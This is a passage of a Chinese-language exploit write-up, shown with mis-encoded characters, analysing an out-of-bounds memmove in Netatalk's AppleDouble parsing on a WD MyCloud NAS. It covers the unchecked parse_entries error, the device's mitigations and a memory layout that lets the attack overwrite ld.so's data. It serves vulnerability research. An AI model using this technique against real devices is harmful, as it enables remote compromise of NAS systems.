    if ((ofork = of_alloc(vol, curdir, path, &ofrefnum, eid, adsame, st)) == NULL)
        return AFPERR_NFILE;
    ...
    /* First ad_open(), opens data or ressource fork */
    if (ad_open(ofork->of_ad, upath, adflags, 0666) < 0) {
```

`ad_open()`å‡½æ•°éå¸¸æ™®é€šï¼Œå®ƒèƒ½å¤Ÿæ‰“å¼€ä¸åŒçš„forkæ–‡ä»¶ï¼šä¸€ä¸ªæ•°æ®ï¼ˆdataï¼‰forkæ–‡ä»¶ï¼Œä¸€ä¸ªå…ƒæ•°æ®ï¼ˆmetadataï¼‰forkæ–‡ä»¶æˆ–è€…ä¸€ä¸ªèµ„æºï¼ˆresourceï¼‰forkæ–‡ä»¶ã€‚ç”±äºæˆ‘ä»¬å¤„ç†çš„æ˜¯ä¸€ä¸ªèµ„æºforkæ–‡ä»¶ï¼ˆè¯‘è€…ï¼šåœ¨åˆ©ç”¨æ—¶ï¼‰ï¼Œæˆ‘ä»¬æœ€ç»ˆä¼šè°ƒç”¨`ad_open_rf()`å‡½æ•°ï¼ˆâ€œrfâ€ä»£è¡¨resource forkï¼‰ã€‚

æ³¨æ„ï¼š`ad_open()`ä½äº`libatalk/`ç›®å½•å½“ä¸­ï¼Œè€Œä¸æ˜¯ä¹‹å‰è®¨è®ºçš„ä»£ç æ‰€åœ¨çš„`etc/afpd`ç›®å½•ã€‚å› æ­¤ï¼Œä»ç°åœ¨èµ·ï¼Œæˆ‘ä»¬åˆ†æçš„ä»£ç éƒ½ä½äº`libatalk.so`åº“ä¸­ã€‚

```c++
//netatalk-3.1.12/libatalk/adouble/ad_open.c
/*!
 * Open data-, metadata(header)- or ressource fork
 *
 * ad_open(struct adouble *ad, const char *path, int adflags, int flags)
 * ad_open(struct adouble *ad, const char *path, int adflags, int flags, mode_t mode)
 *
 * You must call ad_init() before ad_open, usually you'll just call it like this: \n
 * @code
 *      struct adoube ad;
 *      ad_init(&ad, vol->v_adouble, vol->v_ad_options);
 * @endcode
 *
 * Open a files data fork, metadata fork or ressource fork.
 *
 * @param ad        (rw) pointer to struct adouble
 * @param path      (r)  Path to file or directory
 * @param adflags   (r)  Flags specifying which fork to open, can be or'd:
 *                         ADFLAGS_DF:        open data fork
 *                         ADFLAGS_RF:        open ressource fork
 *                         ADFLAGS_HF:        open header (metadata) file
 *                         ADFLAGS_NOHF:      it's not an error if header file couldn't be opened
 *                         ADFLAGS_NORF:      it's not an error if reso fork couldn't be opened
 *                         ADFLAGS_DIR:       if path is a directory you MUST or ADFLAGS_DIR to adflags
 *
 *                       Access mode for the forks:
 *                         ADFLAGS_RDONLY:    open read only
 *                         ADFLAGS_RDWR:      open read write
 *
 *                       Creation flags:
 *                         ADFLAGS_CREATE:    create if not existing
 *                         ADFLAGS_TRUNC:     truncate
 *
 *                       Special flags:
 *                         ADFLAGS_CHECK_OF:  check for open forks from us and other afpd's
 *                         ADFLAGS_SETSHRMD:  this adouble struct will be used to set sharemode locks.
 *                                            This basically results in the files being opened RW instead of RDONLY.
 * @param mode      (r)  mode used with O_CREATE
 *
 * The open mode flags (rw vs ro) have to take into account all the following requirements:
 * - we remember open fds for files because me must avoid a single close releasing fcntl locks for other
 *   fds of the same file
 *
 * BUGS:
 *
 * * on Solaris (HAVE_EAFD) ADFLAGS_RF doesn't work without
 *   ADFLAGS_HF, because it checks whether ad_meta_fileno() is already
 *   openend. As a workaround pass ADFLAGS_SETSHRMD.
 *
 * @returns 0 on success, any other value indicates an error
 */
int ad_open(struct adouble *ad, const char *path, int adflags, ...)
{
    ...
    if (adflags & ADFLAGS_RF) {
        if (ad_open_rf(path, adflags, mode, ad) != 0) {
            EC_FAIL;
        }
    }
```

`ad_open_rf()`å‡½æ•°ä¹‹åä¼šè°ƒç”¨å¹¶è¿›å…¥`ad_open_rf_ea()`å‡½æ•°ï¼š

```c++
//netatalk-3.1.12/libatalk/adouble/ad_open.c
/*!
 * Open ressource fork
 */
static int ad_open_rf(const char *path, int adflags, int mode, struct adouble *ad)
{
    int ret = 0;

    switch (ad->ad_vers) {
    case AD_VERSION2:
        ret = ad_open_rf_v2(path, adflags, mode, ad);
        break;
    case AD_VERSION_EA:
        ret = ad_open_rf_ea(path, adflags, mode, ad);
        break;
    default:
        ret = -1;
        break;
    }

    return ret;
}
```

`ad_open_rf_ea()`å‡½æ•°æ‰“å¼€ï¼ˆè¯‘è€…ï¼šæˆ‘ä»¬æ‰€æŒ‡å®šçš„ï¼‰èµ„æºforkæ–‡ä»¶ã€‚å‡å®šè¯¥æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œè¯¥å‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨å¹¶è¿›å…¥`ad_header_read_osx()`å‡½æ•°ï¼Œè¯»å–è¯¥æ–‡ä»¶çš„ã€åŸºäºAppleDoubleæ ¼å¼çš„å®é™…å†…å®¹ï¼š

```c++
static int ad_open_rf_ea(const char *path, int adflags, int mode, struct adouble *ad)
{
    ...

#ifdef HAVE_EAFD
    ...
#else
    EC_NULL_LOG( rfpath = ad->ad_ops->ad_path(path, adflags) );
    if ((ad_reso_fileno(ad) = open(rfpath, oflags)) == -1) {
        ...
    }
#endif
    opened = 1;
    ad->ad_rfp->adf_refcount = 1;
    ad->ad_rfp->adf_flags = oflags;
    ad->ad_reso_refcount++;

#ifndef HAVE_EAFD
    EC_ZERO_LOG( fstat(ad_reso_fileno(ad), &st) );
    if (ad->ad_rfp->adf_flags & O_CREAT) {
        /* This is a new adouble header file, create it */
        LOG(log_debug, logtype_ad, "ad_open_rf(\"%s\"): created adouble rfork, initializing: \"%s\"",
            path, rfpath);
        EC_NEG1_LOG( new_ad_header(ad, path, NULL, adflags) );
        LOG(log_debug, logtype_ad, "ad_open_rf(\"%s\"): created adouble rfork, flushing: \"%s\"",
            path, rfpath);
        ad_flush(ad);
    } else {
        /* Read the adouble header */
        LOG(log_debug, logtype_ad, "ad_open_rf(\"%s\"): reading adouble rfork: \"%s\"",
            path, rfpath);
        EC_NEG1_LOG( ad_header_read_osx(rfpath, ad, &st) );
    }
#endif
```
æˆ‘ä»¬ç»ˆäºæ¥åˆ°äº†æˆ‘ä»¬çš„æ¼æ´å‡½æ•°ï¼š`ad_header_read_osx()`ã€‚

## B. ç†è§£æ¼æ´
`ad_header_read_osx()`å‡½æ•°è¯»å–èµ„æºforkæ–‡ä»¶çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯å°†æ–‡ä»¶å†…å®¹æ ¹æ®AppleDoubleæ ¼å¼è¿›è¡Œç†è§£ã€‚Netatalkæ ¹æ®AppleDoubleæ ¼å¼ï¼Œå°†æ ¼å¼ä¸­çš„å„ä¸ªå…ƒç´ ä¿å­˜è¿›ç¨‹åºå®šä¹‰çš„`adouble`æ•°æ®ç»“æ„å½“ä¸­ï¼Œè¯¥ç»“æ„å°†åœ¨ä¸‹æ–‡ä¸­è¯¦è§£ã€‚`ad_header_read_osx()`å‡½æ•°å¼€å§‹è¯»å–AppleDoubleå¤´éƒ¨æ¥åˆ¤æ–­è¯¥èµ„æºforkæ–‡ä»¶æœ‰å¤šå°‘ä¸ªentryã€‚

```c++
//netatalk-3.1.12/libatalk/adouble/ad_open.c
/* Read an ._ file, only uses the resofork, finderinfo is taken from EA */
static int ad_header_read_osx(const char *path, struct adouble *ad, const struct stat *hst)
{
    ...
    struct adouble      adosx;
    ...
    LOG(log_debug, logtype_ad, "ad_header_read_osx: %s", path ? fullpathname(path) : "");
    ad_init_old(&adosx, AD_VERSION_EA, ad->ad_options);
    buf = &adosx.ad_data[0];
    memset(buf, 0, sizeof(adosx.ad_data));
    adosx.ad_rfp->adf_fd = ad_reso_fileno(ad);

    /* read the header */
    EC_NEG1( header_len = adf_pread(ad->ad_rfp, buf, AD_DATASZ_OSX, 0) );
    ...
    memcpy(&adosx.ad_magic, buf, sizeof(adosx.ad_magic));
    memcpy(&adosx.ad_version, buf + ADEDOFF_VERSION, sizeof(adosx.ad_version));
    adosx.ad_magic = ntohl(adosx.ad_magic);
    adosx.ad_version = ntohl(adosx.ad_version);
    ...
    memcpy(&nentries, buf + ADEDOFF_NENTRIES, sizeof( nentries ));
    nentries = ntohs(nentries);
    len = nentries * AD_ENTRY_LEN;
```

ä¹‹åæˆ‘ä»¬çœ‹åˆ°ï¼Œè¯¥å‡½æ•°è¿›å…¥äº†`parse_entries()`å‡½æ•°æ¥è§£æä¸åŒçš„AppleDouble entryã€‚æœ‰æ„æ€çš„æ˜¯ï¼Œå½“`parse_entries()`å‡½æ•°å¤±è´¥æ—¶ï¼Œç¨‹åºåªæ˜¯åœ¨æ—¥å¿—ä¸­è®°å½•è¯¥é”™è¯¯ï¼Œä½†å¹¶æ²¡æœ‰é€€å‡ºï¼š

```c++
    nentries = len / AD_ENTRY_LEN;
    if (parse_entries(&adosx, buf, nentries) != 0) {
        LOG(log_warning, logtype_ad, "ad_header_read(%s): malformed AppleDouble",
            path ? fullpathname(path) : "");
    }
```

å¦‚æœæˆ‘ä»¬ä»”ç»†åˆ†æ`parse_entries()`å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå½“ä»¥ä¸‹å‡ ä¸ªæ¡ä»¶ä¹‹ä¸€å‘ç”Ÿæ—¶ï¼Œå‡½æ•°è¿”å›é”™è¯¯ï¼š

* AppleDoubleçš„â€œeidâ€œæ˜¯0
* AppleDoubleçš„â€œoffsetâ€è¶Šç•Œ
* å½“â€œeidâ€ä¸æŒ‡å‘ä¸€ä¸ªèµ„æºforkæ–‡ä»¶ï¼Œä¸”AppleDoubleçš„â€œoffsetâ€åŠ ä¸Šdataçš„é•¿åº¦ä¹‹åè¶Šç•Œ

æˆ‘ä»¬çŸ¥é“ï¼Œæˆ‘ä»¬å¤„ç†çš„æ˜¯èµ„æºforkæ–‡ä»¶ï¼Œå› æ­¤ç¬¬äºŒä¸ªæ¡ä»¶å¾ˆæœ‰è¶£ã€‚ç®€å•æ¥è¯´ï¼Œå®ƒæ„å‘³ç€æˆ‘ä»¬å¯ä»¥åœ¨forkæ–‡ä»¶ä¸­æä¾›ä¸€ä¸ªè¶Šç•Œçš„AppleDouble â€œoffsetâ€å€¼å¹¶è®©`parse_entries()`å‡½æ•°è¿”å›ä¸€ä¸ªé”™è¯¯ï¼Œä½†æ˜¯`ad_header_read_osx()`å‡½æ•°å¿½ç•¥äº†è¿™ä¸ªé”™è¯¯ï¼Œç¨‹åºç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚

```c++
//netatalk-3.1.12/libatalk/adouble/ad_open.c
/**
 * Read an AppleDouble buffer, returns 0 on success, -1 if an entry was malformatted
 **/
static int parse_entries(struct adouble *ad, char *buf, uint16_t nentries)
{
    uint32_t   eid, len, off;
    int        ret = 0;

    /* now, read in the entry bits */
    for (; nentries > 0; nentries-- ) {
        memcpy(&eid, buf, sizeof( eid ));
        eid = get_eid(ntohl(eid));
        buf += sizeof( eid );
        memcpy(&off, buf, sizeof( off ));
        off = ntohl( off );
        buf += sizeof( off );
        memcpy(&len, buf, sizeof( len ));
        len = ntohl( len );
        buf += sizeof( len );

        ad->ad_eid[eid].ade_off = off;
        ad->ad_eid[eid].ade_len = len;

        if (!eid
            || eid > ADEID_MAX
            || off >= sizeof(ad->ad_data)
            || ((eid != ADEID_RFORK) && (off + len >  sizeof(ad->ad_data))))
        {
            ret = -1;
            LOG(log_warning, logtype_ad, "parse_entries: bogus eid: %u, off: %u, len: %u",
                (uint)eid, (uint)off, (uint)len);
        }
    }

    return ret;
}
```

è‡³æ­¤ï¼Œæœ‰å¿…è¦å»äº†è§£è®¾å¤‡å¼€æ”¾äº†å“ªäº›æ¼æ´åˆ©ç”¨çš„ç¼“è§£æªæ–½ï¼Œè¿™æ ·æ‰èƒ½çŸ¥é“æˆ‘ä»¬æ¥ä¸‹æ¥éœ€è¦ç»•è¿‡å“ªäº›é™åˆ¶ï¼ŒåŒæ—¶éœ€è¦åˆ†æ`parse_entries()`å‡½æ•°ä¹‹åçš„ä»£ç æ¥äº†è§£æˆ‘ä»¬éœ€è¦æ„å»ºå“ªäº›æ¼æ´åˆ©ç”¨åŸè¯­ã€‚

# åˆ©ç”¨
## ç¯å¢ƒä¸­çš„ç¼“è§£æªæ–½
æ£€æŸ¥è®¾å¤‡æ“ä½œç³»ç»Ÿçš„å†…æ ¸æ˜¯å¦å¼€æ”¾ASLRï¼š

```
root@MyCloudPR4100 ~ # cat /proc/sys/kernel/randomize_va_space 
2
```

ä»[è¿™é‡Œ](https://docs.oracle.com/cd/E37670_01/E36387/html/ol_aslr_sec.html)å¯çŸ¥ï¼š

* 0 - ç¦ç”¨ASLRã€‚å½“å†…æ ¸ä»¥norandmapså‚æ•°å¯åŠ¨æ—¶ï¼Œå°†åº”ç”¨è¯¥è®¾ç½®ã€‚
* 1 - éšæœºåŒ–æ ˆåœ°å€ã€VDSOé¡µåœ°å€ä»¥åŠå…±äº«å†…å­˜åŒºåŸŸåœ°å€ã€‚æ•°æ®æ®µçš„åŸºåœ°å€ä½äºå¯æ‰§è¡Œä»£ç æ®µæœ«å°¾ä¹‹åã€‚
* 2 - éšæœºåŒ–æ ˆåœ°å€ã€VDSOé¡µåœ°å€ã€å…±äº«å†…å­˜åŒºåŸŸåœ°å€ä»¥åŠæ•°æ®æ®µåœ°å€ã€‚è¿™æ˜¯é»˜è®¤çš„è®¾ç½®ã€‚

ç”¨[checksec.py](https://github.com/Wenzel/checksec.py)è„šæœ¬æ£€æŸ¥`afpd`äºŒè¿›åˆ¶ç¨‹åºçš„ç¼“è§£æªæ–½ï¼š

```
[*] '/home/cedric/pwn2own/firmware/wd_pr4100/_WDMyCloudPR4100_5.17.107_prod.bin.extracted/squashfs-root/usr/sbin/afpd'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

æ€»ç»“ä¸€ä¸‹ï¼š
* `afpd`ï¼šéšæœºåŒ–
    * `.text`ï¼šå¯è¯»/å¯æ‰§è¡Œ
    * `.data`ï¼šå¯è¯»/å¯å†™
* å…±äº«åº“ï¼šéšæœºåŒ–
* å †ï¼šéšæœºåŒ–
* æ ˆï¼šéšæœºåŒ–

ç”±äºæ‰€æœ‰ä¸œè¥¿çš„åœ°å€éƒ½è¢«éšæœºåŒ–ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€äº›ä¿¡æ¯æ³„éœ²çš„åˆ©ç”¨åŸè¯­æ¥ç»•è¿‡ASLRã€‚æˆ‘ä»¬è¿˜éœ€è¦ç ”ç©¶ï¼Œæ˜¯å¦å¯ä»¥è§¦å‘ä¸€æ¡è·¯å¾„ï¼Œä½¿å¾—åç§»è¶Šç•Œè®¿é—®å¯¹æ¼æ´åˆ©ç”¨æœ‰ç”¨ã€‚

## å‘ç°å¥½ç”¨çš„æ¼æ´åˆ©ç”¨åŸè¯­
è®©æˆ‘ä»¬å†æ¥åˆ†æä¸€ä¸‹`ad_header_read_osx()`å‡½æ•°ä¸­çš„ä»£ç ã€‚è¿™é‡Œå‡å®šå‰é¢è®¨è®ºè¿‡çš„`parse_entries()`å‡½æ•°è§£æäº†ä¸€ä¸ªå­˜åœ¨è¶Šç•Œåç§»entryçš„AppleDoubleæ–‡ä»¶ã€‚æ¥çœ‹çœ‹å†`parse_entries()`å‡½æ•°è¿”å›ä¹‹åï¼Œæˆ‘ä»¬è¿˜èƒ½åšäº›ä»€ä¹ˆã€‚å¯ä»¥çœ‹åˆ°ï¼Œå‡å®š`if (ad_getentrylen(&adosx, ADEID_FINDERI) != ADEDLEN_FINDERI) {`æ¡ä»¶æˆç«‹ï¼Œè¯¥å‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨å¹¶è¿›å…¥`ad_convert_osx()`å‡½æ•°ã€‚

```c++
    nentries = len / AD_ENTRY_LEN;
    if (parse_entries(&adosx, buf, nentries) != 0) {
        LOG(log_warning, logtype_ad, "ad_header_read(%s): malformed AppleDouble",
            path ? fullpathname(path) : "");
    }

    if (ad_getentrylen(&adosx, ADEID_FINDERI) != ADEDLEN_FINDERI) {
        LOG(log_warning, logtype_ad, "Convert OS X to Netatalk AppleDouble: %s",
            path ? fullpathname(path) : "");

        if (retry_read > 0) {
            LOG(log_error, logtype_ad, "ad_header_read_osx: %s, giving up", path ? fullpathname(path) : "");
            errno = EIO;
            EC_FAIL;
        }
        retry_read++;
        if (ad_convert_osx(path, &adosx) == 1) {
            goto reread;
        }
        errno = EIO;
        EC_FAIL;
    }
```

å°±åƒä¸‹é¢ä»£ç çš„æ³¨é‡Šä¸­æ‰€å£°æ˜çš„é‚£æ ·ï¼Œ`ad_convert_osx()`å‡½æ•°è´Ÿè´£å°†è‹¹æœAppleDoubleæ–‡ä»¶æ ¼å¼è½¬æ¢ä¸ºNetatalkå®ç°çš„ä¸€ä¸ªæ›´ä¸ºç®€å•çš„æ ¼å¼ã€‚

å¯ä»¥çœ‹å‡ºï¼Œ`ad_convert_osx()`å‡½æ•°ä¸€å¼€å§‹é€šè¿‡æ˜ å°„å°†åŸå§‹çš„forkæ–‡ä»¶ï¼ˆåŸºäºAppleDoubleæ–‡ä»¶æ ¼å¼ï¼‰æ˜ å°„è¿›å†…å­˜å½“ä¸­ã€‚ä¹‹åï¼Œè¯¥å‡½æ•°è°ƒç”¨`memmove()`æ¥ä¸¢å¼ƒæ‰FinderInfoéƒ¨åˆ†çš„å†…å®¹ï¼Œå¹¶å°†å‰©ä½™éƒ¨åˆ†è½¬ç§»åˆ°è¯¥éƒ¨åˆ†çš„å¼€å¤´ã€‚

```c++
//netatalk-3.1.12/libatalk/adouble/ad_open.c
/**
 * Convert from Apple's ._ file to Netatalk
 *
 * Apple's AppleDouble may contain a FinderInfo entry longer then 32 bytes
 * containing packed xattrs. Netatalk can't deal with that, so we
 * simply discard the packed xattrs.
 *
 * As we call ad_open() which might result in a recursion, just to be sure
 * use static variable in_conversion to check for that.
 *
 * Returns -1 in case an error occured, 0 if no conversion was done, 1 otherwise
 **/
static int ad_convert_osx(const char *path, struct adouble *ad)
{
    EC_INIT;
    static bool in_conversion = false;
    char *map;
    int finderlen = ad_getentrylen(ad, ADEID_FINDERI);
    ssize_t origlen;

    if (in_conversion || finderlen == ADEDLEN_FINDERI)
        return 0;
    in_conversion = true;

    LOG(log_debug, logtype_ad, "Converting OS X AppleDouble %s, FinderInfo length: %d",
        fullpathname(path), finderlen);

    origlen = ad_getentryoff(ad, ADEID_RFORK) + ad_getentrylen(ad, ADEID_RFORK);

    map = mmap(NULL, origlen, PROT_READ | PROT_WRITE, MAP_SHARED, ad_reso_fileno(ad), 0);
    if (map == MAP_FAILED) {
        LOG(log_error, logtype_ad, "mmap AppleDouble: %s\n", strerror(errno));
        EC_FAIL;
    }

    memmove(map + ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI,
            map + ad_getentryoff(ad, ADEID_RFORK),
            ad_getentrylen(ad, ADEID_RFORK));
```

æ˜¯æ—¶å€™æ¥çœ‹çœ‹`adouble`ç»“æ„ä½“äº†ã€‚å¯¹äºæˆ‘ä»¬æ¥è¯´ï¼Œå…¶ä¸­é‡è¦çš„å­—æ®µæ˜¯`ad_eid[]`å’Œ`ad_data[]`ã€‚å½“AppleDoubleæ–‡ä»¶è¢«è¯»å–çš„æ—¶å€™ï¼Œ`adouble`ç»“æ„ä½“å°±è¢«æ±¡æŸ“äº†ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ§åˆ¶æ‰€æœ‰çš„è¿™äº›å­—æ®µã€‚

```c++
//netatalk-3.1.12/include/atalk/adouble.h
struct ad_entry {
    off_t     ade_off;
    ssize_t   ade_len;
};

struct adouble {
    uint32_t            ad_magic;         /* Official adouble magic                   */
    uint32_t            ad_version;       /* Official adouble version number          */
    char                ad_filler[16];
    struct ad_entry     ad_eid[ADEID_MAX];

    ...
    char                ad_data[AD_DATASZ_MAX];
};
```

ç”¨æ¥è®¿é—®EIDåç§»ã€é•¿åº¦å­—æ®µä»¥åŠæ•°æ®å†…å®¹çš„å‡½æ•°/å®å®šä¹‰å¯ä»¥ä¸€çœ¼çœ‹å‡ºï¼š

* `ad_getentryoff()`ï¼šè·å–ä¸€ä¸ªEIDåç§»å€¼
* `ad_getentrylen()`ï¼šè·å–ä¸€ä¸ªEIDé•¿åº¦å€¼
* `ad_entry()`ï¼šè·å–EIDå¯¹åº”çš„æ•°æ®ï¼ˆé€šè¿‡ä¸Šé¢çš„åç§»æ¥è·å–ï¼‰

```c++
//netatalk-3.1.12/libatalk/adouble/ad_open.c
off_t ad_getentryoff(const struct adouble *ad, int eid)
{
    if (ad->ad_vers == AD_VERSION2)
        return ad->ad_eid[eid].ade_off;

    switch (eid) {
    case ADEID_DFORK:
        return 0;
    case ADEID_RFORK:
#ifdef HAVE_EAFD
        return 0;
#else
        return ad->ad_eid[eid].ade_off;
#endif
    default:
        return ad->ad_eid[eid].ade_off;
    }
    /* deadc0de */
    AFP_PANIC("What am I doing here?");
}
```

```c++
//netatalk-3.1.12/include/atalk/adouble.h
#define ad_getentrylen(ad,eid)     ((ad)->ad_eid[(eid)].ade_len)
#define ad_setentrylen(ad,eid,len) ((ad)->ad_eid[(eid)].ade_len = (len))
#define ad_setentryoff(ad,eid,off) ((ad)->ad_eid[(eid)].ade_off = (off))
#define ad_entry(ad,eid)           ((caddr_t)(ad)->ad_data + (ad)->ad_eid[(eid)].ade_off)
```

å› æ­¤æˆ‘ä»¬æ§åˆ¶äº†AppleDoubleæ–‡ä»¶çš„æ‰€æœ‰å­—æ®µã€‚æ›´ç¡®åˆ‡åœ°è¯´ï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬å¯ä»¥ä¸ºæˆ‘ä»¬éœ€è¦çš„æ‰€æœ‰entryç²¾å¿ƒæ„é€ éæ³•çš„EIDâ€œåç§»â€ï¼Œè¿™ä¸€åˆ‡éƒ½å› ä¸ºä¹‹å‰è®¨è®ºè¿‡çš„`parse_entries()`å‡½æ•°çš„è¿”å›å€¼æ²¡æœ‰è¢«æ£€æŸ¥ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‹¥æœ‰æ›´å¤§çš„æ•°æ®æ¥ç²¾å¿ƒæ„é€ æ‰€éœ€å¤§å°çš„èµ„æºforkæ–‡ä»¶ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æœ‰æ•ˆæ§åˆ¶`memmove()`å‡½æ•°çš„æºåœ°å€ã€ç›®çš„åœ°å€ä»¥åŠé•¿åº¦å‚æ•°ï¼Œæ¥å‘å†…å­˜æ˜ å°„ä¹‹å¤–çš„åœ°å€ç©ºé—´å†™å…¥æˆ‘ä»¬æ§åˆ¶çš„æ•°æ®ã€‚

æ³¨æ„ï¼šæˆ‘ä»¬éœ€è¦çš„entryæ˜¯`ADEID_FINDERI`å’Œ`ADEID_RFORK`ï¼š

```c++
    memmove(map + ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI,
            map + ad_getentryoff(ad, ADEID_RFORK),
            ad_getentrylen(ad, ADEID_RFORK));
```

ä¸‹ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œå†…å­˜æ˜ å°„çš„åœ°å€è¢«æ˜ å°„åˆ°äº†å“ªé‡Œï¼Ÿ

é€šè¿‡å®é™…æµ‹è¯•æˆ‘ä»¬å‘ç°ï¼Œå¦‚æœforkæ–‡ä»¶çš„å¤§å°å°äº0x1000å­—èŠ‚ï¼Œæ–‡ä»¶å°†è¢«æ˜ å°„åˆ°`uams_pam.so`ï¼Œ`uams_guest.so`å’Œ`ld-2.28.so`ä¹‹å‰çš„éå¸¸é«˜çš„åœ°å€ä½ç½®ã€‚æ›´ç¡®åˆ‡åœ°è¯´ï¼Œ`ld-2.28.so`åœ¨å†…å­˜ä¸­çš„æ˜ å°„èµ·å§‹åœ°å€æ€»æ˜¯åœ¨è¢«æ˜ å°„çš„forkæ–‡ä»¶èµ·å§‹åœ°å€ä¹‹åçš„0xC0000å­—èŠ‚å¤„ï¼Œå³ä½¿ASLRå¼€æ”¾ï¼š

```
(gdb) info proc mappings 
process 26343
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x5579bb534000     0x5579bb53d000     0x9000        0x0 /usr/local/modules/usr/sbin/afpd
      0x5579bb53d000     0x5579bb571000    0x34000     0x9000 /usr/local/modules/usr/sbin/afpd
      0x5579bb571000     0x5579bb57c000     0xb000    0x3d000 /usr/local/modules/usr/sbin/afpd
      0x5579bb57c000     0x5579bb57d000     0x1000    0x47000 /usr/local/modules/usr/sbin/afpd
      0x5579bb57d000     0x5579bb580000     0x3000    0x48000 /usr/local/modules/usr/sbin/afpd
      0x5579bb580000     0x5579bb5a0000    0x20000        0x0 
      0x5579bcd51000     0x5579bcd72000    0x21000        0x0 [heap]
      0x5579bcd72000     0x5579bcd92000    0x20000        0x0 [heap]
      0x7f6c56e30000     0x7f6c56eb0000    0x80000        0x0 
      ...
      0x7f6c57e02000     0x7f6c57e24000    0x22000        0x0 /lib/libc-2.28.so
      0x7f6c57e24000     0x7f6c57f6c000   0x148000    0x22000 /lib/libc-2.28.so
      0x7f6c57f6c000     0x7f6c57fb8000    0x4c000   0x16a000 /lib/libc-2.28.so
      0x7f6c57fb8000     0x7f6c57fb9000     0x1000   0x1b6000 /lib/libc-2.28.so
      0x7f6c57fb9000     0x7f6c57fbd000     0x4000   0x1b6000 /lib/libc-2.28.so
      0x7f6c57fbd000     0x7f6c57fbf000     0x2000   0x1ba000 /lib/libc-2.28.so
      ...
      0x7f6c58129000     0x7f6c58134000     0xb000        0x0 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58134000     0x7f6c58177000    0x43000     0xb000 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58177000     0x7f6c58191000    0x1a000    0x4e000 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58191000     0x7f6c58192000     0x1000    0x67000 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58192000     0x7f6c58194000     0x2000    0x68000 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58194000     0x7f6c581b1000    0x1d000        0x0 
      0x7f6c581b2000     0x7f6c581b3000     0x1000        0x0 /mnt/HD/HD_a2/Public/edg/._mooncake
      0x7f6c581b3000     0x7f6c581b4000     0x1000        0x0 /usr/local/modules/lib/netatalk/uams_pam.so
      0x7f6c581b4000     0x7f6c581b6000     0x2000     0x1000 /usr/local/modules/lib/netatalk/uams_pam.so
      0x7f6c581b6000     0x7f6c581b7000     0x1000     0x3000 /usr/local/modules/lib/netatalk/uams_pam.so
      0x7f6c581b7000     0x7f6c581b8000     0x1000     0x3000 /usr/local/modules/lib/netatalk/uams_pam.so
      0x7f6c581b8000     0x7f6c581b9000     0x1000     0x4000 /usr/local/modules/lib/netatalk/uams_pam.so
      0x7f6c581b9000     0x7f6c581ba000     0x1000        0x0 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581ba000     0x7f6c581bb000     0x1000     0x1000 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581bb000     0x7f6c581bc000     0x1000     0x2000 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581bc000     0x7f6c581bd000     0x1000     0x2000 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581bd000     0x7f6c581be000     0x1000     0x3000 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581be000     0x7f6c581bf000     0x1000        0x0 /lib/ld-2.28.so
      0x7f6c581bf000     0x7f6c581dd000    0x1e000     0x1000 /lib/ld-2.28.so
      0x7f6c581dd000     0x7f6c581e5000     0x8000    0x1f000 /lib/ld-2.28.so
      0x7f6c581e5000     0x7f6c581e6000     0x1000    0x26000 /lib/ld-2.28.so
      0x7f6c581e6000     0x7f6c581e7000     0x1000    0x27000 /lib/ld-2.28.so
      0x7f6c581e7000     0x7f6c581e8000     0x1000        0x0 
      0x7ffe86f2b000     0x7ffe86f71000    0x46000        0x0 [stack]
      0x7ffe86fb7000     0x7ffe86fba000     0x3000        0x0 [vvar]
      0x7ffe86fba000     0x7ffe86fbc000     0x2000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨`memmove()`å‡½æ•°æ¥è¦†ç›–ä¸Šè¿°æˆ‘ä»¬æåˆ°çš„åŠ¨æ€åº“ä¸­çš„ä¸€äº›å†…å®¹ã€‚é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥é€‰æ‹©å“ªä¸ªåŠ¨æ€åº“å‘¢ï¼Ÿ

é€šè¿‡è°ƒè¯•æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œå½“å´©æºƒå‘ç”Ÿæ—¶ï¼Œå¦‚æœæˆ‘ä»¬ç»§ç»­æ‰§è¡Œï¼ŒNetatalkä¸­çš„ä¸€ä¸ªç‰¹æ®Šçš„å¼‚å¸¸å¤„ç†å‡½æ•°ä¼šæ¥å—å¹¶å¤„ç†å½“å‰å¼‚å¸¸ã€‚

æ›´å‡†ç¡®åœ°è¯´ï¼Œæˆ‘ä»¬è¦†ç›–äº†æ•´ä¸ª`ld-2.28.so`çš„`.data`æ®µï¼Œå¹¶æœ€ç»ˆè§¦å‘ä¸‹é¢çš„å´©æºƒï¼š

```
(remote-gdb) bt
